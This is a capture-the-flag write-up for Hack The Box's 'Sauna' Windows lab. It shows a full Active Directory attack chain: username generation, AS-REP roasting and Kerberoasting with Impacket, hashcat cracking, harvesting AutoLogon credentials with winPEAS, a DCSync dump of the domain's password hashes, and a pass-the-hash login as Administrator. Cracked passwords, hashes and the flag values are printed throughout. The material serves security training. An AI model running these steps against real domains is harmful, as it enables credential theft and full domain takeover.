---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - ASREPRoasting
  - Kerberoasting
  - Secrets-Dump
  - DcSync
  - WinPEAS
---
# Overview

| Name        | Sauna     |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -p- -T4 10.129.95.180
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 07:36 CDT
Stats: 0:05:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 07:41 (0:00:08 remaining)
Nmap scan report for 10.129.95.180
Host is up (0.14s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-18 19:41:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-18T19:42:32
|_  start_date: N/A
|_clock-skew: 7h00m10s
```

```bash
echo -e "10.129.95.180\tEGOTISTICAL-BANK.LOCAL" | sudo tee -a /etc/hosts
```

![[sauna.png]]

Fuzzing gave us nothing.
# Enumeration

![[sauna2.png]]

We get bunch of names:

```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb 
```

Lets create different format of username with above names.

```bash
cat > generate_usernames.sh << 'EOF'
#!/bin/bash

generate_users() {
    local first=$1
    local last=$2
    
    # Convert to lowercase
    first_lower=$(echo "$first" | tr '[:upper:]' '[:lower:]')
    last_lower=$(echo "$last" | tr '[:upper:]' '[:lower:]')
    
    # Generate common AD username formats
    echo "${first_lower:0:1}${last_lower}"           # fsmith
    echo "${first_lower}.${last_lower}"              # fergus.smith
    echo "${first_lower}${last_lower}"               # fergussmith
    echo "${last_lower}${first_lower:0:1}"           # smithf
    echo "${first_lower}"                            # fergus
    echo "${last_lower}"                             # smith
    echo "${first_lower:0:1}.${last_lower}"          # f.smith
    echo "${first_lower}_${last_lower}"              # fergus_smith
    echo "${first_lower:0:1}${last_lower:0:1}"       # fs
    echo "${first_lower:0:3}${last_lower:0:3}"       # fersmi
    echo "${last_lower}.${first_lower}"              # smith.fergus
    echo "${last_lower}_${first_lower}"              # smith_fergus
}

# Process each name
names=(
    "Fergus Smith"
    "Shaun Coins"
    "Hugo Bear"
    "Bowie Taylor"
    "Sophie Driver"
    "Steven Kerb"
)

for name in "${names[@]}"; do
    first=$(echo "$name" | cut -d' ' -f1)
    last=$(echo "$name" | cut -d' ' -f2)
    generate_users "$first" "$last"
done
EOF

chmod +x generate_usernames.sh
./generate_usernames.sh > usernames.txt
```
# Initial Foothold
## ASREPRoasting

This attack will run through the list of users we have in the `usernames.txt` file and check if any of them have the privilege `Does not require Pre-Authentication`, if they do then an attack will be performed to guess the user’s password. If the account has `Does not require Pre-Authentication` then the Domain Controller will send a reply back without needing to go through the process of authentication. This is dangerous because part of the DC’s reply (AS-REP) is ciphertext that has been encrypted using the users _password_, the intention would be only the user could look at this information.

Perform ASREPRoasting with those usernames.

```bash
$ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames.txt -dc-ip 10.129.95.180 -format hashcat -outputfile asrep_hashes.txt
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:80f7beabe92d3470d52222f552d7fa47$26d0e676de33ef17e1ab280a1d3c848488e6e8a5ce5027e93be337fb9ad8c03c3dd0ef4238fc6c91fce7718a8db00bd146414eb8d1a97d2f9ac97225af6f41b44d2fdca3eb752e58f0f7e5261150fcfa84177545d4f1ab139d317a01e920f9eb1c241612c9036175eb5dff0a9969fadc161319b079f68a68b39e9ace8b7141ec4a04f68ee86430bf78446e360813fc021c50bc95db1f50f1c14e125e7ca2207631136501395fa35274562564151749a5d3b131d5c47889a3f1002041acda870f77217abe46576eaf04a00b4a2bbac979a24eb33dc4a6411d44c89e8e76a6522b79d35d8fb5ed3beae4bb1ae79c8584ddec7751ede15b758142f775019f607b0e
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
<SNIP>
```

Crack hash of `fsmith`:

```bash
$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

We get pass `Thestrokes23`.

```bash
$ bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u fsmith -p Thestrokes23 -ns 10.129.95.180 -c All
```

![[sauna3.png]]

If we see list all kerberoastable account we get two users so now let's try it.
## Kerberoasting

**ASREPRoasting** targets user accounts that have "Pre-authentication" disabled in Kerberos. This means the Domain Controller will respond to authentication requests without verifying the user's identity first, allowing attackers to obtain encrypted TGT (Ticket Granting Ticket) data that can be cracked offline to reveal the user's password.

**Kerberoasting** targets service accounts (accounts with Service Principal Names - SPNs) in Active Directory. After authenticating as any domain user, you can request service tickets for these SPNs. The service tickets are encrypted with the service account's password, allowing attackers to crack them offline. This is particularly dangerous because service accounts often have elevated privileges and weaker passwords.

```bash
$ sudo GetUserSPNs.py EGOTISTICAL-BANK.LOCAL/fsmith:Thestrokes23 -dc-ip 10.129.95.180 -request
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-22 23:54:34.140321  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL/HSmith*$56c045a113b1ceb0892c64f249fcd6bf$c454b0c76bbc6ac2195d2389f6d8c858c3894f750174491db218f4d65f4021be77dd361fa4b93af0528be5efff0b488d205e598a935dfc2bb2bf14744f141dd1d8bdf6855d7a7824baceaf0498ef8ca723bdff3b636ff896621b60a2a4e0ed2dbe8aab158ab237c5ef1a8a2075a39683733d5b62ee25807fe5ca3bfa19ed4be141cfd083d22303205c1e0fc7f480c713a0cc98562d48968c5f2708d1d9e819a8095130e5e8d567aaf207faed9f86b2da30717cab5af321a207b63c415592a40232d442d560d3f8e8f3c74ebdfca24a397063089402612eddb67c9562b1deec16ac1835b2c04367e0803e83cea8a81d6b5c77416280305ee7ada1a5df39ef7c793cc282fae8a03ace9205b5b54ae279e3b7e4eaeec1b0aef6d685a55557ca89f6021bed17a2ad2d50d3a6df5e724d9c1cdbbc7a8793094c8cfbcefcd773af26c46f83b3f1f60d8d598c8a71fb67f776739bdff6ce282e2c583c545afc128b1084b54197fefaf9b8e35c248d298b649791fce38affe363289a32cf9407aec80459bbcb87cb064900ea8bbb741be762458732faba66253eaf927b1ef9662a90a9a8b61f9d13fa318ec2300a840c283ee5703ef6e1f9f7e07a3c1041b47d404cc882ab0e8294b997326168f7ce266111a7540c09f3262d2406758f1d16547ffefd8e7d80b297271f781202debf6029611e004d6cb5e9e7ef23ac3fb7176aabb9785ce5600f7ec5ad24403e358b7bf2bcdfd648da83631fe05b4dedf2395d3661cc1bf7ab6d09f32d80dcea7f84e80527a300e4987ee15650bd26f99c60b061dd1a98d6dfccb3741f5cd2f5327c3240766c01f0e8e48f9861e47b3adc4be573f74b7ea51aa5bd07cf6876d400989f20bd6711cce7e2b9fe5f29f855760bc0cff54924e6d697d571189b5faf03ba348d6838e7bdfa4087b8b766e4c8616b82d34611d9712470fe415052ebab0c246edeff32fad3de59a6532db10d662726b5f53a5c06880a940bb4e7235fe16a49448833f01bf5dc854ae6354e76e1bbf4fe3863e9acaac53a1c0431689b5255469e678d594f94f5b05fb3db03b6bd840f2bb15586f5a5bc81bc773eccbca1efe970ed6175413db10992892ef9c5ad4f5e6880e6b25e00959f77642175ae0fc05471cfe7a0e9b7f4122b7da7d5232d075c85a0cc3da4e0542ec04a17136d7837e30616c2e45d305018bf855067873c0c8e7aca44591ea7337c52a8a522714e58528b1bdf3191cb72cb79ba744852e9868334b82e0ceede9398ff2c3c52882f5e63ae575045d13b97591133282d595bc59c17bf63314f389022d071099947fd33d133a2728b41287a877eba8c87698e5966c3c72d308b17415f132dc3ca4e8ce545636f4d9dea537de499c2534fed99448cc8fae29d421c37601d32
```

We get hash of `hsmith`, crack it.

```bash
$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

We get same password `Thestrokes23` for `hsmith` too. But `evil-winrm` only works on `fsmith`.

```bash
$ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
96e36c89459a32baa8829ac124d9f712
```
# Privilege Escalation
## WINPeas

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/winPEASx64.exe
```

```powershell
*Evil-WinRM* PS C:\Users\FSmith\Desktop> upload winPEASx64.exe 
```

Run it and we get:

```powershell
<SNIP>
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
<SNIP>
```

We got creds `svc_loanmanager:Moneymakestheworldgoround!`.

![[sauna4.png]]

`svc_loanmanager` can do DCSync on DC.
## DCSync

```bash
$ secretsdump.py -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround\!@10.129.95.180
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
```

The administrator hash is: `823452073d75b9d1cf70ebdf86c7f98e`

```bash
$ evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
f606f4e3d48bbf948d5f847c51d65b7b
```

---
